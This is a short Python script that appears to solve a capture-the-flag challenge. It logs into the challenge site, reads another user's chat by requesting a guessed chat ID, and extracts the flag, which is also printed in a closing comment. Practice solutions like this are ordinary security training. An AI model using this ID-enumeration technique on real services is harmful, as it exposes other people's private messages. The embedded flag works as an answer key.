import requests
import re

site = "http://connexion.challs.olicyber.it"
s = requests.session()


signup = s.post(f"{site}/signin", data={"username" : "zamuvuvuv", "password" : "zamuvuvuv"})
r = s.get(f"{site}/chat/1/2").text
match = re.search(r'ptm\{[^\}]+\}', r)
flag = match.group(0)
print(flag)

#ptm{y0u_ar3_on_7he_righ7_w4y_n0w_th3_fun_b3gin5}